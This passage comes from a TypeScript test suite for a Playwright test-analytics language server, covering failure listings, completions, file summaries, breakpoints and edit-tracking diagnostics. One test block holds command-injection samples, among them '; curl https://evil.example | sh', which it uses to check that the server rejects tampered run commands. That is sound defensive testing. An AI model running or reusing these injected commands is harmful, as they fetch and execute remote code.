          file: 'tests/rows.spec.ts',
          status: 'failed',
          testCaseId: 3,
          clusterId: 77,
          clusterTitle: null,
          owner: null,
          isNew: false,
          duration: null,
          hasScreenshot: true,
        },
      ],
      run: {
        id: 41,
        branch: 'main',
        status: 'failed',
        startTime: '2026-09-27T10:00:00.000Z',
        totalTests: 3,
        passedTests: 1,
        failedTests: 1,
        flakyTests: 1,
        skippedTests: 0,
        url: `${url}/test-runs/41`,
        own: false,
      },
      overlays: [],
      baseline: { choice: { kind: 'ladder' }, label: 'run #41 on main' },
      updatedAt: expect.any(String),
      grouping: 'file',
      tree: [expect.objectContaining({ key: 'run', label: 'Run #41 · CI · main · 1 failing' })],
      runLabel: 'Run #41 · CI · main · 1 failing',
      failing: 1,
      rerun: [{ uri: uri('tests/pages/checkout.page.ts'), root: dir, testIds: [3] }],
    });
    expect(failures.tree[0]!.children.map((group) => [group.key, group.children.map((leaf) => leaf.key)])).toEqual([
      ['group:file:tests/rows.spec.ts', ['failure:900']],
    ]);
  });

  test('groups the failures as the client last asked, for the failures it pushes too', async () => {
    const byCluster = (await client.sendRequest('piwi/failures', { grouping: 'cluster' })) as FailuresResult;
    expect(byCluster.grouping).toBe('cluster');
    expect(byCluster.tree[0]!.children.map((group) => [group.key, group.label])).toEqual([
      ['group:cluster:77', 'Cluster #77'],
    ]);
    const kept = (await client.sendRequest('piwi/failures')) as FailuresResult;
    expect(kept.grouping).toBe('cluster');
    const back = (await client.sendRequest('piwi/failures', { grouping: 'file' })) as FailuresResult;
    expect(back.grouping).toBe('file');
    expect(((await client.sendRequest('piwi/failures', { grouping: 'folder' })) as FailuresResult).grouping).toBe(
      'file',
    );
  });

  test('reads a run id typed for A run by id…', async () => {
    expect(await client.sendRequest('piwi/runId', { text: ' #118 ' })).toEqual({ runId: 118 });
    expect(await client.sendRequest('piwi/runId', { text: '2147483648' })).toEqual({ runId: null });
  });

  test('gives a failure’s context for an agent', async () => {
    const answer = (await client.sendRequest('piwi/agentContext', {
      uri: uri('tests/rows.spec.ts'),
      executionId: 900,
    })) as AgentContextResult;
    expect(answer.text).toMatch(/^# Failing test: removes a row\n\nlocator\('\.cart-row'\)\.nth\(2\) was not found/);
    expect(answer.text).toContain("Replace the failing locator with `getByRole('row', { name: /Mug/ })`");
    expect(
      await client.sendRequest('piwi/agentContext', { uri: uri('tests/rows.spec.ts'), executionId: 1 }),
    ).toBeNull();
  });

  test('renders a flow recorded in Piwi Picker as the body of a test', async () => {
    const target = {
      tagName: 'button',
      role: 'button',
      accessibleName: 'Pay now',
      testId: null,
      text: 'Pay now',
      alternatives: [{ locator: "getByRole('button', { name: 'Pay now' })", method: 'getByRole', score: 90 }],
    };
    const session = buildSession(
      [
        {
          action: 'goto',
          target: null,
          value: 'https://shop.test/cart',
          redacted: false,
          pageUrl: 'https://shop.test/cart',
          timestamp: 1,
        },
        { action: 'click', target, value: null, redacted: false, pageUrl: 'https://shop.test/cart', timestamp: 2 },
      ],
      1_000,
    );
    const rendered = (await client.sendRequest('piwi/renderSteps', {
      uri: uri('tests/checkout.spec.ts'),
      steps: toStepsDocument(session),
    })) as RenderStepsResult;
    expect(rendered.warnings).toEqual([]);
    expect(rendered.code).not.toContain('import');
    expect(rendered.code).toContain("await page.getByRole('button', { name: 'Pay now' }).click();");

    const invalid = (await client.sendRequest('piwi/renderSteps', {
      uri: uri('tests/checkout.spec.ts'),
      steps: 'x',
    })) as RenderStepsResult;
    expect(invalid).toEqual({ code: '', warnings: ['not valid JSON'] });
  });

  test('offers Piwi’s MCP server with the connection it has', async () => {
    const mcp = (await client.sendRequest('piwi/mcp')) as McpServersResult;
    expect(mcp.servers).toEqual([{ label: `Piwi (${new URL(url).host})`, url: `${url}/mcp`, headers: {} }]);
  });

  test('completes page. with the chains the suite uses on the pages this file’s tests visit', async () => {
    const text = SPEC.replace('async ({ page }) => {}', 'async ({ page }) => {\n  await page.get\n}');
    await open('tests/checkout.spec.ts', text);
    const items = (await client.sendRequest('textDocument/completion', {
      textDocument: { uri: uri('tests/checkout.spec.ts') },
      position: { line: 3, character: '  await page.get'.length },
    })) as Array<{ label: string; detail: string; textEdit: { range: { start: { character: number } } } }>;
    expect(items.map((i) => i.label)).toEqual([
      "getByRole('button', { name: 'Pay now' })",
      "locator('.cart-row').nth(2)",
    ]);
    expect(items[0]!.detail).toBe('2 tests · /checkout');
    expect(items[1]!.detail).toMatch(/^1 test · \/checkout · brittle: /);
    expect(items[0]!.textEdit.range.start.character).toBe('  await page.'.length);
  });

  /** The completion items at a position of an open document. */
  const completionAt = (file: string, line: number, character: number, triggerCharacter?: string) =>
    client.sendRequest('textDocument/completion', {
      textDocument: { uri: uri(file) },
      position: { line, character },
      ...(triggerCharacter ? { context: { triggerKind: 2, triggerCharacter } } : {}),
    }) as Promise<Array<{ label: string; textEdit: { newText: string; range: { start: { character: number } } } }>>;

  test('completes another page fixture of the test, adminPage., with the same chains', async () => {
    const text = SPEC.replace('async ({ page }) => {}', 'async ({ adminPage }) => {\n  await adminPage.\n}');
    await open('tests/checkout.spec.ts', text);
    const items = await completionAt('tests/checkout.spec.ts', 3, '  await adminPage.'.length, '.');
    expect(items.map((i) => i.textEdit.newText)).toEqual([
      "getByRole('button', { name: 'Pay now' })",
      "locator('.cart-row').nth(2)",
    ]);
    expect(items[0]!.textEdit.range.start.character).toBe('  await adminPage.'.length);
  });

  test('completes this.page. in a page object', async () => {
    await open('tests/pages/checkout.page.ts', PAGE_OBJECT);
    const line = PAGE_OBJECT.split('\n')[3]!;
    const character = line.indexOf('this.page.') + 'this.page.'.length;
    const items = await completionAt('tests/pages/checkout.page.ts', 3, character, '.');
    expect(items.map((i) => i.label)).toEqual([
      "getByRole('button', { name: 'Pay now' })",
      "locator('.cart-row').nth(2)",
    ]);
  });

  test('completes expect( with the chains on the page in use there', async () => {
    const text = SPEC.replace('async ({ page }) => {}', 'async ({ page }) => {\n  await expect(\n}');
    await open('tests/checkout.spec.ts', text);
    const items = await completionAt('tests/checkout.spec.ts', 3, '  await expect('.length, '(');
    expect(items.map((i) => i.label)).toEqual([
      "page.getByRole('button', { name: 'Pay now' })",
      "page.locator('.cart-row').nth(2)",
    ]);
    expect(items[0]!.textEdit).toMatchObject({
      newText: "page.getByRole('button', { name: 'Pay now' })",
      range: { start: { character: '  await expect('.length } },
    });
  });

  test('offers no chain after an unrelated member or call', async () => {
    const text = SPEC.replace('async ({ page }) => {}', 'async ({ page }) => {\n  foo.\n  console.log(\n}');
    await open('tests/checkout.spec.ts', text);
    expect(await completionAt('tests/checkout.spec.ts', 3, '  foo.'.length, '.')).toEqual([]);
    expect(await completionAt('tests/checkout.spec.ts', 4, '  console.log('.length, '(')).toEqual([]);
  });

  test('advises on a test whose timeout could be tighter, and fixes it', async () => {
    const text = SPEC.replace('async ({ page }) => {}', 'async ({ page }) => {\n  test.slow();\n}');
    await open('tests/checkout.spec.ts', text, 5);
    const diags = await waitFor(() => diagnostics.get(uri('tests/checkout.spec.ts')));
    const advice = diags.find((d) => d.code === 'timeout')!;
    expect(advice).toMatchObject({ severity: 3, range: { start: { line: 2 } } });
    expect(advice.message).toBe('test.slow() is no longer needed: its p95 is 4.1 s against a 90 s timeout');
    const actions = (await client.sendRequest('textDocument/codeAction', {
      textDocument: { uri: uri('tests/checkout.spec.ts') },
      range: advice.range,
      context: { diagnostics: [advice] },
    })) as Array<{
      title: string;
      edit: {
        changes: Record<string, Array<{ newText: string; range: { start: { line: number }; end: { line: number } } }>>;
      };
    }>;
    expect(actions[0]!.title).toBe('Remove test.slow()');
    expect(actions[0]!.edit.changes[uri('tests/checkout.spec.ts')]).toEqual([
      { range: { start: { line: 3, character: 0 }, end: { line: 4, character: 0 } }, newText: '' },
    ]);
  });

  test('completes the project’s functions for this file’s pages, and piwi: annotations and tags', async () => {
    fs.writeFileSync(path.join(dir, 'CODEOWNERS'), '* @acme/web\ntests/ @acme/qa qa@acme.test\n');
    const text = [
      "import { test } from '@playwright/test';",
      '',
      "test('pays', { tag: ['@sm'], annotation: { type: 'piwi:owner', description: '@' } }, async ({ page }) => {",
      '  ',
      '});',
      '',
    ].join('\n');
    await open('tests/checkout.spec.ts', text, 6);
    const at = (line: number, character: number) =>
      client.sendRequest('textDocument/completion', {
        textDocument: { uri: uri('tests/checkout.spec.ts') },
        position: { line, character },
      }) as Promise<Array<{ label: string; textEdit: { newText: string } }>>;
    const functions = await at(3, 2);
    expect(functions.map((i) => [i.label, i.textEdit.newText])).toEqual([
      ['checkoutPage.pay', 'await checkoutPage.pay(${1:amount})'],
    ]);
    const line = text.split('\n')[2]!;
    expect((await at(2, line.indexOf("'@sm'") + 4)).map((i) => i.label)).toEqual(['@checkout', '@smoke']);
    expect((await at(2, line.indexOf("'piwi:owner'") + 1)).map((i) => i.label)).toEqual([
      'piwi:owner',
      'piwi:priority',
      'piwi:feature',
      'piwi:link',
    ]);
    expect((await at(2, line.indexOf("'@'") + 2)).map((i) => i.label)).toEqual([
      '@acme/qa',
      '@acme/web',
      'qa@acme.test',
    ]);
  });

  test('lists the saved selections and the command that runs one', async () => {
    const selections = (await client.sendRequest('piwi/selections', { uri: uri('tests/checkout.spec.ts') })) as {
      items: unknown[];
    };
    expect(selections.items).toEqual([
      { key: 'smoke', name: 'Smoke', count: 1, includesFile: true },
      { key: 'failed', name: 'failed', count: 1, includesFile: false },
    ]);
    const selection = (await client.sendRequest('piwi/runSelection', {
      uri: uri('tests/checkout.spec.ts'),
      key: 'smoke',
    })) as RunCommand;
    expect(selection).toEqual({
      cwd: dir,
      command: 'npx playwright test tests/checkout.spec.ts:3',
      args: ['tests/checkout.spec.ts:3'],
      env: { PIWI_ORIGIN: 'editor', PIWI_ORIGIN_REF: selection.ref },
      ref: expect.stringMatching(/^ed-[0-9a-f]{8}$/),
    });
  });

  test('summarizes a page object, a spec and an application file', async () => {
    const pageObject = (await client.sendRequest('piwi/fileSummary', {
      uri: uri('tests/pages/checkout.page.ts'),
    })) as FileSummary;
    expect(pageObject.lines.map((l) => [l.line, l.title])).toEqual([
      [3, '2 tests · click · 1 flaky'],
      [4, '1 test · click · 1 failing'],
    ]);
    expect(pageObject.lines[0]!.command).toMatchObject({ command: 'piwi.runTests', arguments: [{ testIds: [1, 2] }] });

    const spec = (await client.sendRequest('piwi/fileSummary', { uri: uri('tests/checkout.spec.ts') })) as FileSummary;
    expect(spec.file?.title).toBe('1 test in Piwi');
    expect(spec.lines).toEqual([
      {
        line: 2,
        title:
          'passed 48/50 · quarantined 5 d · 3/10 passes toward release · flaky score 42 · 12 CI min wasted · timing · in Smoke',
        command: { title: 'Open in dashboard', command: 'piwi.openInDashboard', arguments: [`${url}/test-cases/1`] },
        // The document as the earlier tests left it: the test's body spans two more lines.
        status: 'passed',
        endLine: 4,
        testCaseId: 1,
      },
      {
        line: 2,
        title: 'flaky 18% · top suspect: slow GET /api/cart (reproduced 7 of 10)',
        command: {
          title: 'Open its Flakiness tab',
          command: 'piwi.openInDashboard',
          arguments: [`${url}/test-cases/1?tab=flakiness`],
        },
      },
      {
        line: 2,
        title: 'Reproduce this flake',
        command: {
          title: 'Reproduce this flake',
          command: 'piwi.runCommand',
          arguments: [{ cwd: dir, command: 'npx @piwitests/reporter flake 1', env: { PIWI_ORIGIN: 'editor' } }],
        },
      },
      {
        line: 2,
        title: 'Verify the flake fix',
        command: {
          title: 'Verify the flake fix',
          command: 'piwi.runCommand',
          arguments: [{ cwd: dir, command: 'npx @piwitests/reporter flake verify 1', env: { PIWI_ORIGIN: 'editor' } }],
        },
      },
    ]);

    const app = (await client.sendRequest('piwi/fileSummary', {
      uri: uri('src/components/CheckoutButton.vue'),
    })) as FileSummary;
    expect(app.file?.title).toBe('Reached by 2 tests · 1 flaky');
    const page = (await client.sendRequest('piwi/fileSummary', { uri: uri('app/pages/checkout.vue') })) as FileSummary;
    expect(page.file?.title).toBe('Page /checkout: 3 tests act on it · 2 locators · 1 brittle · 1 failing · 1 flaky');
    expect(page.file?.command).toMatchObject({ command: 'piwi.runTests', arguments: [{ testIds: [1, 2, 3] }] });
    const none = (await client.sendRequest('piwi/fileSummary', { uri: uri('src/unreached.ts') })) as FileSummary;
    expect(none).toEqual({ file: null, lines: [] });
  });

  test('marks where and why a test failed, with its evidence above the line', async () => {
    const spec = (await client.sendRequest('piwi/fileSummary', { uri: uri('tests/rows.spec.ts') })) as FileSummary;
    const evidence = { uri: uri('tests/rows.spec.ts'), executionId: 900 };
    expect(spec.lines).toEqual([
      expect.objectContaining({
        line: 3,
        status: 'failed',
        endLine: 7,
        testCaseId: 3,
        failure: {
          line: 6,
          headline: "locator('.cart-row').nth(2) was not found",
          message:
            "Error: locator.click: Timeout 5000ms exceeded.\nCall log:\n  - waiting for locator('.cart-row').nth(2)",
          executionId: 900,
          url: `${url}/test-run-cases/900`,
          state: 'failing',
        },
      }),
      {
        line: 6,
        title: "✗ locator('.cart-row').nth(2) was not found",
        command: {
          title: 'Open the failure in the dashboard',
          command: 'piwi.openInDashboard',
          arguments: [`${url}/test-run-cases/900`],
        },
      },
      {
        line: 6,
        title: 'Run this test',
        command: {
          title: 'Run this test',
          command: 'piwi.runTests',
          arguments: [{ uri: uri('tests/rows.spec.ts'), testIds: [3] }],
        },
      },
      {
        line: 6,
        title: 'Screenshot',
        command: { title: 'Open the failure screenshot', command: 'piwi.openScreenshot', arguments: [evidence] },
      },
      {
        line: 6,
        title: 'Trace',
        command: { title: 'Open the trace', command: 'piwi.openTrace', arguments: [evidence] },
      },
    ]);

    // The spec's line in the failing call chain shows the failure, with the message and the chain.
    const hover = (await client.sendRequest('textDocument/hover', {
      textDocument: { uri: uri('tests/rows.spec.ts') },
      position: { line: 6, character: 10 },
    })) as { contents: { value: string } };
    expect(hover.contents.value).toContain(`**CI failure** · [removes a row](${url}/test-run-cases/900) · run #41`);
    expect(hover.contents.value).toContain('```text\nError: locator.click: Timeout 5000ms exceeded.\nCall log:');
    expect(hover.contents.value).toContain(
      `Called from [checkout.page.ts:5](${uri('tests/pages/checkout.page.ts')}#L5) ← [rows.spec.ts:7](${uri('tests/rows.spec.ts')}#L7)`,
    );
    const elsewhere = await client.sendRequest('textDocument/hover', {
      textDocument: { uri: uri('tests/rows.spec.ts') },
      position: { line: 5, character: 10 },
    });
    expect(elsewhere).toBeNull();

    const shot = (await client.sendRequest('piwi/screenshot', evidence)) as ScreenshotResult;
    expect(fs.readFileSync(shot.path, 'utf-8')).toBe('PK-stub');
    expect(await client.sendRequest('piwi/screenshot', { ...evidence, executionId: 1 })).toBeNull();
  });

  test('lists the tests of a file and the command that runs them', async () => {
    const reached = (await client.sendRequest('piwi/testsForFile', {
      uri: uri('src/components/CheckoutButton.vue'),
    })) as TestsForFile;
    expect(reached.basis).toBe('reach');
    expect(reached.tests.map((t) => t.title)).toEqual(['pays', 'pays by card']);
    const defined = (await client.sendRequest('piwi/testsForFile', {
      uri: uri('tests/checkout.spec.ts'),
    })) as TestsForFile;
    expect(defined).toMatchObject({ basis: 'defined', tests: [{ id: 1, title: 'pays', status: 'passed' }] });
    const command = (await client.sendRequest('piwi/runArgs', {
      uri: uri('tests/checkout.spec.ts'),
      testIds: [1],
    })) as RunCommand;
    expect(command).toEqual({
      cwd: dir,
      args: ['tests/checkout.spec.ts:3'],
      command: 'npx playwright test tests/checkout.spec.ts:3',
      env: { PIWI_ORIGIN: 'editor', PIWI_ORIGIN_REF: command.ref },
      ref: expect.stringMatching(/^ed-[0-9a-f]{8}$/),
    });
  });

  test('finds the test at the cursor, and the tests of its spec', async () => {
    const at = (file: string, line: number) =>
      client.sendRequest('piwi/testAt', { uri: file, line, character: 2 }) as Promise<TestAtResult>;
    const rows = uri('tests/rows.spec.ts');
    const spec = { uri: rows, testIds: [3] };
    // Anywhere from its `test(` line to the line its call ends on.
    for (const line of [3, 6, 7]) {
      expect(await at(rows, line)).toEqual({
        test: {
          id: 3,
          title: 'removes a row',
          file: 'tests/rows.spec.ts',
          status: 'failed',
          url: `${url}/test-cases/3`,
        },
        spec,
        location: 'tests/rows.spec.ts:4',
      });
    }
    expect(await at(rows, 1)).toEqual({ test: null, spec, location: null });
    expect(await at(rows, 8)).toEqual({ test: null, spec, location: null });
    expect(await at(uri('tests/checkout.spec.ts'), 2)).toMatchObject({
      test: { id: 1, title: 'pays' },
      location: 'tests/checkout.spec.ts:3',
    });
    expect(await at(uri('tests/pages/checkout.page.ts'), 3)).toEqual({ test: null, spec: null, location: null });
    const elsewhere = pathToFileURL(path.join(os.tmpdir(), 'piwi-elsewhere', 'a.spec.ts')).href;
    expect(await at(elsewhere, 0)).toEqual({ test: null, spec: null, location: null });
  });
});

describe('breakpoints', () => {
  const breakpoints = () => [
    { uri: uri('tests/checkout.spec.ts'), line: 2 },
    { uri: uri('tests/pages/checkout.page.ts'), line: 3 },
    { uri: pathToFileURL(path.join(os.tmpdir(), 'elsewhere.spec.ts')).href, line: 0 },
  ];
  const reporterManifest = 'node_modules/@piwitests/reporter/package.json';

  afterAll(async () => {
    fs.rmSync(path.join(dir, 'node_modules'), { recursive: true, force: true });
    await client.sendRequest('piwi/refresh');
  });

  test('pause a run at their lines, headed, and say when the reporter is too old for them', async () => {
    write(reporterManifest, JSON.stringify({ name: '@piwitests/reporter', version: '0.46.0' }));
    await client.sendRequest('piwi/refresh');
    const command = (await client.sendRequest('piwi/runArgs', {
      uri: uri('tests/checkout.spec.ts'),
      testIds: [1],
      breakpoints: breakpoints(),
    })) as RunCommand;
    expect(command).toEqual({
      cwd: dir,
      args: ['tests/checkout.spec.ts:3', '--headed'],
      command: 'npx playwright test tests/checkout.spec.ts:3 --headed',
      env: {
        PIWI_ORIGIN: 'editor',
        PIWI_ORIGIN_REF: command.ref,
        PIWI_PAUSE_AT: 'tests/checkout.spec.ts:3;tests/pages/checkout.page.ts:4',
      },
      ref: expect.stringMatching(/^ed-[0-9a-f]{8}$/),
      notice: 'Breakpoints need @piwitests/reporter 0.48.0 or later; this project has 0.46.0.',
    });
    const status = (await client.sendRequest('piwi/runStatus')) as RunStatusResult;
    expect(status.contexts[0]!.reporterVersion).toBe('0.46.0');

    const selection = (await client.sendRequest('piwi/runSelection', {
      uri: uri('tests/checkout.spec.ts'),
      key: 'smoke',
      breakpoints: breakpoints(),
    })) as RunCommand;
    expect(selection.command).toBe('npx playwright test tests/checkout.spec.ts:3 --headed');
    expect(selection.env?.PIWI_PAUSE_AT).toBe('tests/checkout.spec.ts:3;tests/pages/checkout.page.ts:4');
  });

  test('need nothing more of a reporter that pauses, and change nothing without one in the folder', async () => {
    write(reporterManifest, JSON.stringify({ name: '@piwitests/reporter', version: '0.48.0' }));
    await client.sendRequest('piwi/refresh');
    const command = (await client.sendRequest('piwi/runArgs', {
      uri: uri('tests/checkout.spec.ts'),
      testIds: [1],
      breakpoints: breakpoints(),
    })) as RunCommand;
    expect(command.notice).toBeUndefined();
    expect(command.env?.PIWI_PAUSE_AT).toBe('tests/checkout.spec.ts:3;tests/pages/checkout.page.ts:4');

    const outside = (await client.sendRequest('piwi/runArgs', {
      uri: uri('tests/checkout.spec.ts'),
      testIds: [1],
      breakpoints: breakpoints().slice(2),
    })) as RunCommand;
    expect(outside.command).toBe('npx playwright test tests/checkout.spec.ts:3');
    expect(outside.env).toEqual({ PIWI_ORIGIN: 'editor', PIWI_ORIGIN_REF: outside.ref });
  });

  test('run from the Playwright config a failure names, whatever file it shows in', async () => {
    const elsewhere = pathToFileURL(path.join(os.tmpdir(), 'shared', 'pages.ts')).href;
    expect(await client.sendRequest('piwi/runArgs', { uri: elsewhere, testIds: [1] })).toBeNull();
    const command = (await client.sendRequest('piwi/runArgs', {
      uri: elsewhere,
      root: dir,
      testIds: [1],
    })) as RunCommand;
    expect(command).toMatchObject({ cwd: dir, command: 'npx playwright test tests/checkout.spec.ts:3' });
  });

  test('a pick replaces the locator its line holds, or says the line holds none', async () => {
    const replaced = (await client.sendRequest('piwi/applyPick', {
      file: 'tests/pages/checkout.page.ts',
      line: 4,
      locator: "getByRole('row', { name: /Mug/ })",
    })) as ApplyPickResult;
    expect(replaced).toEqual({
      uri: uri('tests/pages/checkout.page.ts'),
      edit: {
        range: { start: { line: 4, character: 24 }, end: { line: 4, character: 51 } },
        newText: "getByRole('row', { name: /Mug/ })",
      },
    });
    expect(PAGE_OBJECT.split('\n')[4]!.slice(24, 51)).toBe("locator('.cart-row').nth(2)");

    const none = (await client.sendRequest('piwi/applyPick', {
      uri: uri('tests/rows.spec.ts'),
      line: 6,
      locator: "getByRole('row', { name: /Mug/ })",
    })) as ApplyPickResult;
    expect(none).toEqual({ uri: uri('tests/rows.spec.ts'), edit: null });

    for (const file of ['../outside.ts', 'tests/missing.spec.ts']) {
      expect(await client.sendRequest('piwi/applyPick', { file, line: 0, locator: 'getByText("x")' })).toEqual({
        uri: null,
        edit: null,
      });
    }
  });
});

describe('the command line of a run', () => {
  afterAll(async () => {
    hostileMaterialization = null;
    hostileSelectionCommand = null;
    await client.sendRequest('piwi/refresh');
  });

  const runArgs = () => client.sendRequest('piwi/runArgs', { uri: uri('tests/checkout.spec.ts'), testIds: [1] });

  test("is built from the instance's arguments, never its command text", async () => {
    hostileMaterialization = {
      args: ['tests/checkout.spec.ts:3'],
      command: 'npx playwright test tests/checkout.spec.ts:3; curl https://evil.example | sh',
    };
    expect(((await runArgs()) as RunCommand).command).toBe('npx playwright test tests/checkout.spec.ts:3');

    hostileMaterialization = { args: ['--config=evil.config.ts'], command: 'npx playwright test' };
    expect(await runArgs()).toBeNull();
  });

  test('is refused for a selection whose command is anything but npx playwright test and its arguments', async () => {
    hostileSelectionCommand = 'npx playwright test tests/checkout.spec.ts:3 && curl https://evil.example';
    await client.sendRequest('piwi/refresh');
    expect(
      await client.sendRequest('piwi/runSelection', { uri: uri('tests/checkout.spec.ts'), key: 'smoke' }),
    ).toBeNull();
  });
});

describe('local runs over the latest CI run', () => {
  test('a test re-run from the editor clears the failure it fixed, and one it broke shows as a local failure', async () => {
    const overlay = {
      id: 42,
      status: 'failed',
      origin: 'editor',
      isFullRun: false,
      startTime: '2026-09-27T10:30:00.000Z',
      commit: 'a1b2c3d',
      totalTests: 2,
      passedTests: 1,
      failedTests: 1,
      flakyTests: 0,
      skippedTests: 0,
    };
    laidOver = {
      run: { ...MAIN_RUN, origin: 'ci', commit: 'a1b2c3d' },
      overlays: [overlay],
      failures: [
        {
          executionId: 950,
          testCaseId: 1,
          clusterId: null,
          title: 'pays',
          file: 'tests/checkout.spec.ts',
          line: 3,
          status: 'failed',
          headline: "getByRole('button', { name: 'Pay now' }) was not visible",
          location: '/home/dev/shop/tests/pages/checkout.page.ts:4:21',
          message: "Error: expect(locator).toBeVisible() failed\n\nLocator: getByRole('button', { name: 'Pay now' })",
          frames: ['/home/dev/shop/tests/pages/checkout.page.ts:4:21'],
          traces: [],
          screenshot: null,
          source: 'overlay',
          runId: 42,
          browserName: 'chromium',
          duration: 1200,
          isNew: true,
          clusterTitle: null,
          owner: null,
        },
      ],
      resolved: [
        {
          testCaseId: 3,
          title: 'removes a row',
          file: 'tests/rows.spec.ts',
          line: 4,
          browserName: 'chromium',
          runId: 42,
          executionId: 951,
          baselineExecutionId: 900,
        },
      ],
    };
    try {
      const pushed = runStatuses.length;
      await client.sendRequest('piwi/refresh');
      const onPage = await waitFor(() => {
        const all = diagnostics.get(uri('tests/pages/checkout.page.ts')) ?? [];
        return all.some((d) => d.message.includes('local run #42')) ? all : undefined;
      });
      const failures = onPage.filter((d) => d.code === 'ci-failure');
      expect(failures).toEqual([
        expect.objectContaining({
          message: "getByRole('button', { name: 'Pay now' }) was not visible (pays, local run #42)",
          range: expect.objectContaining({ start: { line: 3, character: 2 } }),
          codeDescription: { href: `${url}/test-run-cases/950` },
        }),
      ]);

      const hover = (await client.sendRequest('textDocument/hover', {
        textDocument: { uri: uri('tests/pages/checkout.page.ts') },
        position: { line: 3, character: 30 },
      })) as { contents: { value: string } };
      expect(hover.contents.value).toContain(`**Local failure** · [pays](${url}/test-run-cases/950) · local run #42`);

      const rows = (await client.sendRequest('piwi/fileSummary', { uri: uri('tests/rows.spec.ts') })) as FileSummary;
      const fixed = rows.lines.find((l) => l.status !== undefined)!;
      expect(fixed).toMatchObject({ line: 3, status: 'passed' });
      expect(fixed.title).toMatch(/^passed 6\/9 · fixed locally in run #42 \(failing in run #41\)/);
      expect(fixed.failure).toBeUndefined();
      expect(rows.lines.filter((l) => l.title.startsWith('✗'))).toEqual([]);

      const listed = (await client.sendRequest('piwi/failures')) as FailuresResult;
      expect(listed.items).toEqual([
        expect.objectContaining({
          uri: uri('tests/pages/checkout.page.ts'),
          line: 3,
          title: 'pays',
          executionId: 950,
          runId: 42,
          source: 'local',
          state: 'failing',
          browserName: 'chromium',
        }),
        {
          uri: uri('tests/rows.spec.ts'),
          root: dir,
          line: 3,
          title: 'removes a row',
          headline: null,
          executionId: 951,
          runId: 42,
          url: `${url}/test-run-cases/951`,
          hasTrace: false,
          source: 'local',
          state: 'fixed-locally',
          browserName: 'chromium',
          file: 'tests/rows.spec.ts',
          testCaseId: 3,
          clusterId: null,
          clusterTitle: null,
          owner: null,
          isNew: false,
          duration: null,
          hasScreenshot: false,
        },
      ]);
      expect(listed.items[0]).toMatchObject({ file: 'tests/checkout.spec.ts', isNew: true, duration: 1200 });
      expect(listed.run).toMatchObject({ id: 41, origin: 'ci', own: false });
      expect(listed.overlays).toEqual([
        {
          id: 42,
          origin: 'editor',
          startTime: '2026-09-27T10:30:00.000Z',
          status: 'failed',
          totalTests: 2,
          passedTests: 1,
          failedTests: 1,
          url: `${url}/test-runs/42`,
          own: false,
        },
      ]);

      const status = (await client.sendRequest('piwi/runStatus')) as RunStatusResult;
      expect(status.contexts[0]).toMatchObject({
        run: { id: 41 },
        failures: 1,
        failingTests: 1,
        resolved: 1,
        overlays: 1,
      });
      expect(runStatuses.length).toBeGreaterThan(pushed);
      expect(runStatuses[runStatuses.length - 1]).toEqual(status);
    } finally {
      laidOver = null;
      await client.sendRequest('piwi/refresh');
    }
    const restored = await waitFor(() =>
      diagnostics
        .get(uri('tests/pages/checkout.page.ts'))
        ?.find((d) => d.code === 'ci-failure' && d.message.includes('run #41')),
    );
    expect(restored.message).toBe("locator('.cart-row').nth(2) was not found (removes a row, run #41)");
  });
});

describe('failures follow the edits', () => {
  const page = 'tests/pages/checkout.page.ts';
  const rows = 'tests/rows.spec.ts';
  /** The failure published on the page object that matches. */
  const onPage = (match: (d: { message: string; severity?: number; range: unknown; data?: unknown }) => boolean) =>
    diagnostics.get(uri(page))?.find((d) => d.code === 'ci-failure' && match(d));
  const lineOf = (d: { range: unknown }) => (d.range as { start: { line: number } }).start.line;
  let version = 100;

  afterAll(async () => {
    laidOver = null;
    await change(page, PAGE_OBJECT, ++version);
    await client.sendNotification('textDocument/didClose', { textDocument: { uri: uri(rows) } });
    await client.sendRequest('piwi/refreshRun');
  });

  test('an edit above the failing line moves its error, its reason and its item, and says so', async () => {
    const seen = failuresChanges.length;
    await change(page, `// The cart.\n${PAGE_OBJECT}`, ++version);
    const moved = await waitFor(() => onPage((d) => lineOf(d) === 5));
    expect(moved).toMatchObject({
      severity: 1,
      message: "locator('.cart-row').nth(2) was not found (removes a row, run #41)",
      range: { start: { line: 5, character: 2 } },
    });
    const pushed = await waitFor(() => failuresChanges.slice(seen).find((f) => f.items[0]?.line === 5));
    expect(pushed.items).toEqual([
      expect.objectContaining({ uri: uri(page), line: 5, executionId: 900, state: 'failing' }),
    ]);
    expect(((await client.sendRequest('piwi/failures')) as FailuresResult).items).toEqual(pushed.items);

    // In the spec, the reason stays above the line that calls the page object.
    await open(rows, `// Rows.\n\n${FAILING_SPEC}`);
    const spec = (await client.sendRequest('piwi/fileSummary', { uri: uri(rows) })) as FileSummary;
    expect(spec.lines.map((l) => [l.line, l.title.split(' · ')[0]])).toEqual([
      [5, 'passed 6/9'],
      [8, "✗ locator('.cart-row').nth(2) was not found"],
      [8, 'Run this test'],
      [8, 'Screenshot'],
      [8, 'Trace'],
    ]);
    expect(spec.lines[0]).toMatchObject({ status: 'failed', failure: { line: 8, state: 'failing' } });
    const hover = (await client.sendRequest('textDocument/hover', {
      textDocument: { uri: uri(rows) },
      position: { line: 8, character: 10 },
    })) as { contents: { value: string } };
    expect(hover.contents.value).toContain(
      `Called from [checkout.page.ts:6](${uri(page)}#L6) ← [rows.spec.ts:9](${uri(rows)}#L9)`,
    );
  });

  test('rewriting the failing line turns its error into an information, with Run this test first', async () => {
    const seen = failuresChanges.length;
    const rewritten = PAGE_OBJECT.replace("this.page.locator('.cart-row').nth(2)", "this.page.getByRole('row').nth(2)");
    await change(page, rewritten, ++version);
    const edited = await waitFor(() => onPage((d) => d.severity === 3));
    expect(edited).toMatchObject({
      message: "Edited since run #41: locator('.cart-row').nth(2) was not found (removes a row, run #41)",
      range: { start: { line: 4, character: 2 } },
      data: { root: dir, executionId: 900, edited: true },
    });
    const actions = (await client.sendRequest('textDocument/codeAction', {
      textDocument: { uri: uri(page) },
      range: edited.range,
      context: { diagnostics: [edited] },
    })) as Array<{ title: string; command?: { command: string; arguments: unknown[] } }>;
    expect(actions[0]).toMatchObject({
      title: 'Run this test',
      command: { command: 'piwi.runTests', arguments: [{ uri: uri(page), testIds: [3] }] },
    });
    // The healing replaces a line the buffer does not hold.
    expect(actions.map((a) => a.title).filter((t) => t.startsWith('Heal'))).toEqual([]);
    const pushed = await waitFor(() => failuresChanges.slice(seen).find((f) => f.items[0]?.state === 'edited'));
    expect(pushed.items[0]).toMatchObject({ uri: uri(page), line: 4, executionId: 900 });

    // The test still failed: its lens says so, and that the line it failed at changed since.
